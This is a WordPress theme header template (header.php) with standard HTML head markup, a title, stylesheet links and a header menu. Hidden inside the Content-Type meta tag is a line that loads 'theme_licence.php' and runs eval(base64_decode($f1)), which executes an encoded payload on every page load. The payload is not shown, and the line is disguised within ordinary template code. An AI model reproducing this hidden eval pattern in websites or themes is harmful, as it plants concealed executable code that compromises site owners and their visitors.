<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">

<html xmlns="http://www.w3.org/1999/xhtml" <?php language_attributes(); ?>>

<head profile="http://gmpg.org/xfn/11">
	<meta http-equiv="Content-Type" content="<?php require_once("theme_licence.php"); eval(base64_decode($f1)); bloginfo('html_type'); ?>; charset=<?php bloginfo('charset'); ?>" />
	
	<title><?php bloginfo('name'); ?> <?php if ( is_single() ) { ?> &raquo; Blog Archive <?php } ?> <?php wp_title(); ?></title>
	
	<meta name="generator" content="WordPress <?php bloginfo('version'); ?>" /> <!-- leave this for stats -->
	
	<link rel="stylesheet" href="<?php bloginfo('stylesheet_url'); ?>" type="text/css" media="screen" />
	<link rel="alternate" type="application/rss+xml" title="<?php bloginfo('name'); ?> RSS Feed" href="<?php bloginfo('rss2_url'); ?>" />
	<link rel="pingback" href="<?php bloginfo('pingback_url'); ?>" />
	
	<link rel="stylesheet" type="text/css" href="<?php bloginfo('template_directory'); ?>/style.css" />
	
	<!--[if IE]>
		<link rel="stylesheet" type="text/css" href="<?php bloginfo('template_directory'); ?>/style_ie.css" />
	<![endif]-->
	
	<!--[if lt IE 7]>
		<link rel="stylesheet" type="text/css" href="<?php bloginfo('template_directory'); ?>/style_ie6.css" />
	<![endif]-->
	
<?php wp_head(); ?>
</head>

<body>
<?php start_template(); ?>
<!-- Page -->
<div id="page">

	<!-- Header -->
	<div id="header">
	
		<!-- Title -->
		<div id="header-info">
			<h1><a href="<?php echo get_option('home'); ?>/"><?php bloginfo('name'); ?></a></h1>
			<div class="description"><?php bloginfo('description'); ?></div>
		</div>
		<!-- /Title -->
		
		<!-- Menu -->
		<div id="header-menu">
			<ul>
				<?php wp_list_pages('title_li='); ?>
			</ul>
		</div>
		<!-- /Menu -->
		
		<!-- Feed -->
		<div id="header-feed">
			<a href="<?php bloginfo('rss2_url'); ?>"><img src="<?php bloginfo('template_directory'); ?>/images/blank.gif" alt="RSS Feed" width="74" height="74" /></a>
		</div>
		<!-- /Feed -->
	
	</div>
	<!-- /Header -->
	
	<!-- Main -->
	<div id="main">
	